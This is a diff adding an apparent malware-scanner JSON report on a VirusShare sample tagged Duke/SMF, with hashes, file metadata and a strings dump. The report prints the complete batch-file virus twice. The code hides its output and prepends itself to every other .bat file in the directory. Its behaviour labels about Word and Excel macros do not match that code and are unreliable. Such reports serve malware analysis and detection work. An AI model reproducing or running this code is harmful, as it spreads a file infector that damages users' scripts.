@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@ctty nul%SMF%\nif \"%1==\"@ goto SMFz\nfind \"SMF\"<%0>SMF.bat\nfor %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b\ndel SMF.*\nctty con%SMF%\n@goto SMF\n:SMFz\nfind \"SMF\"<%2\nif not errorlevel 1 goto SMF\ntype %2>SMF.1\ntype SMF.bat>%2\ntype SMF.1>>%2\n:SMF [Duke/SMF]"
+    },
+    "filename": "VirusShare_459b1ddf1ae3d3042d6b95f4a1033cf4",
+    "filesize": 282,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "459b1ddf1ae3d3042d6b95f4a1033cf4",
+        "sha1": "5cb5a14e6e16d5cc5dba0c08b35a9745f41d80de",
+        "sha256": "6ab2fa8a10ea6dbcb205c5282c850b7b40cd66ac72ef95cb48c0b9ad9e564f93"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul%SMF%",
+            "if \"%1==\"@ goto SMFz",
+            "find \"SMF\"<%0>SMF.bat",
+            "for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b",
+            "del SMF.*",
+            "ctty con%SMF%",
+            "@goto SMF",
+            ":SMFz",
+            "find \"SMF\"<%2",
+            "if not errorlevel 1 goto SMF",
+            "type %2>SMF.1",
+            "type SMF.bat>%2",
+            "type SMF.1>>%2",
+            ":SMF [Duke/SMF]"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.287212",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
